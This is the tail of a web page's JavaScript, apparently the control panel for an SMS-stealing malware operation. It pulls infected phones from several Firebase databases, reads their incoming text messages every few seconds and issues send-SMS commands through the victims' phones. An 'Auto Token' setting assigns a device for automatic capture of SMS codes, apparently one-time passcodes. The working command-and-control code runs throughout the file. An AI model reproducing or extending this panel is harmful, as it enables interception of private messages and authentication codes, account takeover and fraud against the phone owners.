      DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
      return p;
    }}
  }catch(e){}
  return DEFAULT_FIREBASES.slice();
}
function initFirebaseInstance(cfg){
  var appName='mfb_'+cfg.id,db=null;
  if(cfg.apiKey){
    try{
      var exists=false;firebase.apps.forEach(function(a){if(a.name===appName)exists=true;});
      if(!exists)firebase.initializeApp({apiKey:cfg.apiKey,authDomain:cfg.authDomain||'',databaseURL:cfg.databaseURL,projectId:cfg.projectId||cfg.id,storageBucket:cfg.storageBucket||'',messagingSenderId:cfg.messagingSenderId||'',appId:cfg.appId||''},appName);
      db=firebase.app(appName).database();
    }catch(e){}
  }
  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false};
  firebaseInstances.push(inst);return inst;
}
function initFirebase(){
  firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
  firebaseConfigs.forEach(initFirebaseInstance);
  try{activeFbId=localStorage.getItem(ACTIVE_FB_KEY)||'';}catch(e){}
  if(!activeFbId&&firebaseConfigs.length){var r=firebaseConfigs.find(function(c){return c.id==='rabel_raand';});activeFbId=r?r.id:firebaseConfigs[0].id;}
  updateFbUi();
}
initFirebase();

function updateFbUi(){
  var inst=getFbInstance(activeFbId);
  var name=inst?inst.name:'—';
  document.getElementById('fbChip').textContent=name;
  document.getElementById('moreFbName').textContent=name;
  document.getElementById('hdrSub').textContent=inst?(getFilteredDevs().length+' devices · '+name):'No Firebase';
  var html=firebaseConfigs.map(function(c){
    var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
    return '<div class="fb-option'+(c.id===activeFbId?' active':'')+'" onclick="switchFirebase(\''+c.id+'\')"><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices</div></div>';
  }).join('');
  document.getElementById('fbSheetList').innerHTML=html;
}
function switchFirebase(id){
  if(!getFbInstance(id))return;
  activeFbId=id;try{localStorage.setItem(ACTIVE_FB_KEY,id);}catch(e){}
  if(selDev){var d=getSelDev();if(!d||d.fbId!==id){selDev='';clearListeners();}}
  updateFbUi();renderDevices();renderDeviceView();renderSms();updateSendForm();
  closeFbSheet();toast('Switched to '+getFbInstance(id).name,true);
}
function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}

function getPhoneFromRecord(s){
  if(!s)return'';
  if(s.mobNo)return String(s.mobNo).trim();
  if(s.sims&&s.sims.length)for(var i=0;i<s.sims.length;i++){var p=s.sims[i]&&(s.sims[i].phoneNumber||s.sims[i].number);if(p)return String(p).trim();}
  return String(s.phone_number||s.phone||s.mobile||'').trim();
}
function resolveOnlineStatus(s,fbId){
  var inst=getFbInstance(fbId);var schema=inst?inst.schema:'spinplay';
  if(schema==='rabel')return s.status===true||s.online===true;
  if(s.online_status===true)return true;if(s.online_status===false)return false;
  return s.online===true||s.status==='online'||s.status===true;
}
function normalizeClientRecord(raw){
  if(!raw||typeof raw!=='object')return null;
  if(raw.password||raw.Pass)return null;
  if(raw.modelName||raw.deviceId||raw.mobNo)return{
    name:raw.modelName||'Unknown',brand:raw.brand||'',android:raw.androidV||'',
    online:raw.status===true,battery:parseInt(raw.battery,10)||0,
    network:raw.service_provider||'?',sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)
  };
  return{name:raw.name||raw.device_model||'Unknown',brand:raw.brand||'',android:raw.android||'',
    online_status:raw.online_status,online:raw.online,status:raw.status,
    battery:parseInt(raw.battery||raw.battery_level,10)||0,network:raw.network||'?',
    sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)};
}
function ingestDeviceData(fbId,node,devId,data){
  var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
  norm._node=node;norm._fbId=fbId;
  clientsRawMap[makeDevKey(fbId,devId)]=Object.assign({},clientsRawMap[makeDevKey(fbId,devId)]||{},norm);
}
function mergeSummaryNode(fbId,node,raw){
  if(!raw||typeof raw!=='object')return;
  Object.keys(raw).forEach(function(k){if(raw[k]&&typeof raw[k]==='object')ingestDeviceData(fbId,node,k,raw[k]);});
}
function processClientsData(){
  allDevs=[];
  var raw={};Object.keys(clientsRawMap).forEach(function(k){if(!activeFbId||k.indexOf(activeFbId+'::')===0)raw[k]=clientsRawMap[k];});
  Object.keys(raw).forEach(function(k){
    var s=raw[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
    var on=resolveOnlineStatus(s,p.fbId);
    allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
      name:s.name||'Unknown',displayPhone:getPhoneFromRecord(s)||'No Number',brand:s.brand||'',android:s.android||'',
      status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0});
  });
  allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
  if(!selDev&&allDevs.length)selDev=allDevs[0].id;
  renderDevices();updateStats();updateFbUi();
}
function bumpStat(id,val){
  var el=document.getElementById(id);
  if(!el||el.textContent===String(val))return;
  el.textContent=val;el.classList.remove('bump');void el.offsetWidth;el.classList.add('bump');
}
function updateStats(){
  var l=getFilteredDevs();
  var t=l.length,o=l.filter(function(d){return d.status==='online';}).length,f=l.filter(function(d){return d.status==='offline';}).length;
  bumpStat('stTotal',t);bumpStat('stOnline',o);bumpStat('stOffline',f);
  _lastStats={t:t,o:o,f:f};
}
function fetchSummaryNode(inst,node){
  return restJson(inst.restUrl+'/'+node+'.json').then(function(raw){mergeSummaryNode(inst.id,node,raw);processClientsData();});
}
function discoverInstance(inst){
  return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
    if(!roots||typeof roots!=='object')return;
    var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
    var tasks=[];
    nodes.forEach(function(n){
      if(SUMMARY_NODES.indexOf(n)>=0||n==='clients')tasks.push(fetchSummaryNode(inst,n));
      else if(n==='devices')tasks.push(fetchSummaryNode(inst,n));
    });
    return Promise.all(tasks);
  });
}
function attachLive(inst){
  if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
  ['clients','devices_status'].forEach(function(node){
    inst.db.ref(node).on('value',function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
  });
}
function fetchAllData(){
  document.getElementById('hdrSub').textContent='Syncing...';
  firebaseInstances.forEach(attachLive);
  return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
    processClientsData();
    document.getElementById('hdrSub').textContent=getFilteredDevs().length+' devices';
    if(selDev)loadSmsForDevice();
  });
}
var IOS_COLORS=['c-blue','c-purple','c-titanium','c-gold','c-red'];
var IOS_MODELS=['iPhone 15 Pro','iPhone 14','iPhone 15','iPhone 13 Pro Max','iPhone 16 Pro'];
var _lastStats={t:0,o:0,f:0},_tabOrder=['home','device','sms','send','more'];

function iosColor(i){return IOS_COLORS[(i||0)%IOS_COLORS.length];}
function iosModel(d,i){
  var n=(d.name||'').toLowerCase();
  if(/iphone|ios|apple/i.test(n)||/iphone|apple/i.test(d.brand||''))return d.name||'iPhone';
  return IOS_MODELS[(i||0)%IOS_MODELS.length];
}
function iosTime(){var t=new Date();return t.getHours()+':'+String(t.getMinutes()).padStart(2,'0');}
function iosBatteryHtml(pct,large){
  var low=pct<20?' low':'';
  return '<div class="ios-bat-mini'+low+'"><span style="width:'+Math.max(4,Math.min(100,pct))+'%"></span></div>';
}
function iosSignalHtml(){
  return '<div class="ios-sig"><i></i><i></i><i></i></div>';
}
function iphoneShellHtml(d,i,large){
  var col=iosColor(i),on=d.status==='online';
  var shellCls='iphone-shell '+col+(large&&on?' online':'');
  return '<div class="'+shellCls+'">'+
    '<div class="iphone-screen">'+
    '<div class="iphone-island"></div>'+
    '<div class="ios-status-top"><span class="ios-time">'+iosTime()+'</span>'+
    '<div class="ios-status-icons">'+iosSignalHtml()+iosBatteryHtml(bat,large)+'</div></div>'+
    '<div class="ios-lock-icon">🔒</div>'+
    '<div class="ios-screen-phone">'+esc(d.displayPhone)+'</div>'+
    '<div class="ios-screen-model">'+esc(iosModel(d,i))+'</div>'+
    '<div class="ios-home-bar"></div>'+
  '<div class="ios-online-pip"></div></div></div>';
}

function refreshData(){
  var btn=document.getElementById('refreshBtn');
  if(btn){btn.classList.add('spinning');setTimeout(function(){btn.classList.remove('spinning');},800);}
  toast('Refreshing...',true);fetchAllData();
}

function renderDevices(){
  var q=(document.getElementById('devSearch').value||'').toLowerCase();
  var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId).toLowerCase().includes(q);});
  var el=document.getElementById('devList');
  if(!list.length){el.innerHTML='<div class="empty-state"><div class="ico">📱</div>No iOS devices yet<br><span style="font-size:11px;opacity:.6">Syncing Firebase...</span></div>';return;}
  window._devList=list;
  el.innerHTML=list.map(function(d,i){
    var delay=Math.min(i*0.06,0.4);
    return '<div class="ios-row '+d.status+(d.id===selDev?' active':'')+'" style="animation-delay:'+delay+'s" data-idx="'+i+'" onclick="selectDeviceIdx('+i+')">'+
      iphoneShellHtml(d,i,false)+
      '<div class="ios-info">'+
      '<div class="ios-info-phone">'+esc(d.displayPhone)+'</div>'+
      '<div class="ios-info-model"><em>'+esc(iosModel(d,i))+'</em> · '+esc(d.name)+'</div>'+
      '<div class="ios-chips"><span class="chip ios">iOS</span><span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
      '</div></div>';
  }).join('');
}
function selectDeviceIdx(i){
  var d=window._devList&&window._devList[i];
  if(d)selectDevice(d.id);
}
function selectDevice(id){
  selDev=id;renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice();
  switchTab('device',document.querySelector('.nav-item[data-tab="device"]'));
}

function renderDeviceView(){
  var d=getSelDev(),empty=document.getElementById('deviceEmpty'),hero=document.getElementById('deviceHero');
  if(!d){empty.classList.remove('hidden');hero.classList.add('hidden');return;}
  empty.classList.add('hidden');hero.classList.remove('hidden');
  var idx=window._devList?window._devList.findIndex(function(x){return x.id===d.id;}):0;
  if(idx<0)idx=0;
  hero.innerHTML='<div class="hero-wrap">'+
    '<div class="hero-badge-wrap"><span class="hero-badge '+d.status+'">'+(d.status==='online'?'● ONLINE':'○ OFFLINE')+'</span></div>'+
    '<div class="hero-iphone">'+iphoneShellHtml(d,idx,true)+'</div>'+
    '<div class="hero-stats">'+
    '<div class="hero-cell"><div class="hero-lbl">BATTERY</div><div class="hero-val">'+d.battery+'%</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">NETWORK</div><div class="hero-val">'+esc(d.network)+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">DEVICE</div><div class="hero-val">'+esc(iosModel(d,idx))+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">SMS</div><div class="hero-val">'+d.smsCount+'</div></div>'+
    '</div><div class="hero-uid">'+esc(d.rawId)+'</div></div>';
}
function updateSendForm(){
  var d=getSelDev();
  document.getElementById('sendEmpty').classList.toggle('hidden',!!d);
  document.getElementById('sendForm').classList.toggle('hidden',!d);
}

function clearListeners(){
  Object.keys(activeListeners).forEach(function(k){
    var L=activeListeners[k];
    if(L.timer)clearInterval(L.timer);
    else if(L.db&&L.ref){L.ref.off('value',L.h);L.ref.off('child_added',L.h);}
  });
  activeListeners={};
}
function loadSmsForDevice(){
  var d=getSelDev();if(!d)return;
  document.getElementById('smsEmpty').classList.add('hidden');
  clearListeners();
  var inst=getFbInstance(d.fbId);
  if(inst&&inst.schema==='rabel'){
    var path='messages/'+d.rawId;
    if(inst.db){
      var ref=inst.db.ref(path).limitToLast(80);
      var h=function(s){renderSmsFromData(s.val());};
      ref.on('value',h);activeListeners[d.id]={db:inst.db,ref:ref,h:h};
    }else{
      var tick=function(){restJson(inst.restUrl+'/'+path+'.json').then(renderSmsFromData);};
      tick();activeListeners[d.id]={timer:setInterval(tick,3000)};
    }
  }else{
    var p2=(d.deviceNode||'devices')+'/'+d.rawId+'/new_sms';
    var tick2=function(){restJson(inst.restUrl+'/'+p2+'.json').then(renderSmsFromData);};
    tick2();activeListeners[d.id]={timer:setInterval(tick2,3000)};
  }
}
function smsAsList(raw){
  if(!raw)return[];
  if(Array.isArray(raw))return raw.filter(function(x){return x&&typeof x==='object';});
  return Object.keys(raw).map(function(k){return raw[k];}).filter(function(x){return x&&typeof x==='object';});
}
function normalizeSms(m){
  if(!m||typeof m!=='object')return null;
  var body=m.body||m.message||m.text||m.content||'';
  if(!body)return null;
  return{address:m.address||m.sender||m.from||m.number||'?',body:body,
    date_readable:m.date_readable||m.dateTime||m.time||'—',
    type:String(m.type||m.direction||'inbox').toLowerCase()};
}
function renderSmsFromData(data){
  var list=smsAsList(data).map(normalizeSms).filter(Boolean);
  list.sort(function(a,b){return String(b.date_readable).localeCompare(String(a.date_readable));});
  window_sms=list.slice(0,60);renderSms();
}
function renderSms(){
  var d=getSelDev(),el=document.getElementById('smsList');
  if(!d){document.getElementById('smsEmpty').classList.remove('hidden');el.innerHTML='';return;}
  if(!window_sms.length){el.innerHTML='<div class="empty-state"><div class="ico">📭</div>No SMS on this device</div>';return;}
  el.innerHTML=window_sms.map(function(s,i){
    var out=s.type==='sent'||s.type==='outbox';
    var delay=Math.min(i*0.04,0.5);
    return '<div class="sms-bubble '+(out?'out':'in')+'" style="animation-delay:'+delay+'s">'+
      '<div class="sms-from">'+esc(s.address)+'</div>'+
      esc(s.body)+'<div class="sms-time">'+esc(s.date_readable)+'</div></div>';
  }).join('');
}

function sendSms(){
  var d=getSelDev();if(!d){toast('Select a device first',false);return;}
  var inst=getFbInstance(d.fbId),to=document.getElementById('sendTo').value.trim(),msg=document.getElementById('sendMsg').value.trim();
  if(!to||!msg){toast('Fill number and message',false);return;}
  document.getElementById('sendStatus').textContent='Sending...';
  var path=inst.restUrl+'/clients/'+encodeURIComponent(d.rawId)+'/webhookEvent/sendSms.json';
  var payload={to:to,message:msg,from:1,isSended:false};
  if(inst.schema!=='rabel')path=inst.restUrl+'/'+(d.deviceNode||'devices')+'/'+encodeURIComponent(d.rawId)+'/manual_commands/send_sms.json';
  fetch(path,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){
    if(r.ok){document.getElementById('sendStatus').textContent='✅ Sent';document.getElementById('sendMsg').value='';toast('SMS sent',true);}
    else{document.getElementById('sendStatus').textContent='❌ Failed';toast('Send failed',false);}
  }).catch(function(){document.getElementById('sendStatus').textContent='❌ Error';toast('Network error',false);});
}

var _currentTab='home';
function switchTab(name,btn){
  var prevIdx=_tabOrder.indexOf(_currentTab),nextIdx=_tabOrder.indexOf(name);
  document.querySelectorAll('.screen').forEach(function(s){
    s.classList.remove('active','slide-back');
    if(s.id==='screen-'+_currentTab&&nextIdx<prevIdx)s.classList.add('slide-back');
  });
  var screen=document.getElementById('screen-'+name);
  screen.classList.add('active');
  _currentTab=name;
  document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
  if(btn)btn.classList.add('active');
  if(name==='sms'&&selDev)loadSmsForDevice();
  if(name==='device')renderDeviceView();
  if(name==='send')updateSendForm();
}

/* AUTH */
function authFetch(body){
  return fetch(AUTH_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body||{})})
    .then(function(r){return r.json().then(function(j){return{ok:r.ok,data:j};});});
}
function getSession(){try{return JSON.parse(localStorage.getItem('rbl_session')||sessionStorage.getItem('rbl_session')||'null');}catch(e){return null;}}
function unlockApp(token,exp,remember){
  var s={token:token,exp:exp||0};
  if(remember)localStorage.setItem('rbl_session',JSON.stringify(s));else sessionStorage.setItem('rbl_session',JSON.stringify(s));
  document.getElementById('loginScreen').classList.add('hidden');
  document.getElementById('appShell').classList.remove('hidden');
  if(!panelReady){panelReady=true;fetchAllData();loadAutoTokenState();setInterval(function(){document.querySelectorAll('.ios-time').forEach(function(el){el.textContent=iosTime();});},30000);}
}
function doLogin(){
  var key=(document.getElementById('loginKey').value||'').trim().toUpperCase();
  if(!key){document.getElementById('loginErr').textContent='Enter access key';document.getElementById('loginErr').style.display='block';return;}
  document.getElementById('loginBtn').disabled=true;
  authFetch({action:'login',key:key,remember:document.getElementById('rememberMe').checked}).then(function(res){
    document.getElementById('loginBtn').disabled=false;
    if(res.ok&&res.data&&res.data.ok){unlockApp(res.data.token,res.data.expires,document.getElementById('rememberMe').checked);return;}
    document.getElementById('loginErr').textContent=res.data&&res.data.error||'Invalid key';
    document.getElementById('loginErr').style.display='block';
  }).catch(function(){document.getElementById('loginBtn').disabled=false;});
}
function doLogout(){
  var s=getSession();if(s&&s.token)authFetch({action:'logout',token:s.token});
  localStorage.removeItem('rbl_session');sessionStorage.removeItem('rbl_session');
  location.reload();
}
document.getElementById('loginKey').addEventListener('input',function(){this.value=this.value.toUpperCase().replace(/[^A-Z0-9\-]/g,'');});

/* AUTO TOKEN (via sex.php API) */
var _autoTokenOn=false;
function smsTokenFetch(body){
  var s=getSession();body=body||{};if(s&&s.token)body.token=s.token;
  return fetch(SMS_TOKEN_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)})
    .then(function(r){return r.json();});
}
function loadAutoTokenState(){
  smsTokenFetch({action:'get'}).then(function(d){
    if(d&&d.ok&&d.config){_autoTokenOn=!!d.config.enabled;document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);}
  }).catch(function(){});
}
function toggleAutoToken(){
  _autoTokenOn=!_autoTokenOn;
  document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);
  smsTokenFetch({action:'save',enabled:_autoTokenOn}).then(function(){toast(_autoTokenOn?'Auto Token ON':'Auto Token OFF',true);});
}
function useSelForAutoToken(){
  var d=getSelDev();if(!d){toast('Select device on Home',false);return;}
  var inst=getFbInstance(d.fbId);
  smsTokenFetch({action:'save',enabled:_autoTokenOn,device_id:d.rawId,database_url:inst.restUrl,fb_name:inst.name}).then(function(){
    toast('Auto SMS device set',true);
  });
}

/* BOOT */
(function(){
  var s=getSession();
  if(s&&s.token){
    authFetch({action:'check',token:s.token}).then(function(res){
      if(res.ok&&res.data&&res.data.ok)unlockApp(s.token,s.exp,true);
      else localStorage.removeItem('rbl_session');
    });
  }
})();
setInterval(function(){
  if(!panelReady)return;
  var s=getSession();
  if(s&&s.token)authFetch({action:'check',token:s.token}).then(function(res){
    if(!res.ok||!res.data||!res.data.ok){doLogout();}
  });
},30000);
</script>
</body>
</html>
